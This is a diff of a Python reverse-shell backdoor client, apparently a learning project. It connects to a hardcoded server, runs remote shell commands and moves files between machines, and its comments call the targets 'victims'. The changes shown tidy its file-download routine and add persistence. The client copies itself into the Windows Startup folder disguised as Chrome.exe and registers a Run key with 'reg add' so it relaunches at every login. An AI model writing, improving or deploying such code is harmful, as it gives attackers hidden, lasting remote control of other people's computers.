@@ -3,6 +3,8 @@ import time
 import json
 import subprocess
 import os
+import shutil
+import sys
 
 IP_ADDRESS = '192.168.0.16'
 PORT = 54321
@@ -73,23 +75,32 @@ def upload_file(file_name):
 def download_file(file_name):
     # open file object 'f' using 
     # 'wb' => write bytes to a file
+    # ***
     f = open(file_name, 'wb')    
+    # ***
     # If timeout is NOT set, sometimes program will get stuck
     s.settimeout(1)
+    #print(f'Starting to receive bytes in chunks from simple files...')
+    
     # Receive data from multiple chunks
-    chunk = s.recv(1024)
-    # As long as there's something in chunk variable
-    while chunk:
-        # Writing the chunk into file
-        f.write(chunk)
-        try:
+    try:
+        chunk = s.recv(1024)
+        # As long as there's something in chunk variable
+        while chunk:
+            # Writing the chunk into file
+            f.write(chunk)
+
+            #print(f'Server is writing chunks of 1024 bytes of simple files from victims...')
             chunk = s.recv(1024)
         # If there's any errors => reached End of file
-        except socket.timeout as e:
-            break
+    except socket.timeout as e:
+        pass
+        #print(f'Server has no pending 1024-byte chunks in queue...\nExiting...\n')
+    finally:
         s.settimeout(None)
         # Close file upon complete sending files from victims
         f.close()
+        #print(f'This server is closing open-file on victims\' machines')
         
 def shell():
     while True:
@@ -140,6 +151,23 @@ def shell():
             result = result.decode()
             reliable_send(result)
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# Bind socket => connection() => shell() => Call connection()
-connection()
+# ============= Gaining persistency
+# A common C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Programs\Chrome.exe ;)
+location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Chrome.exe"
+
+# If 'location' does NOT exist, it's 1st time running this Backdoor client
+
+if not os.path.exists(location):
+#     # Performing copying action of our Backdoor.exe to User's /AppData
+      shutil.copyfile(sys.executable, location)
+#     # Allow users to proactively connect to our backdoor server
+#     # whenever they login to their machines
+#     #
+#     # Appending machine startup .exe permissions to Victims' Windows regkey at
+#     # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+#     # /v = Name; /t = Type; /d = Data
+      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Chrome.exe /t REG_SZ /d "' + location + '"', shell=True)
+else:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Bind socket => connection() => shell() => Call connection()
+    connection()
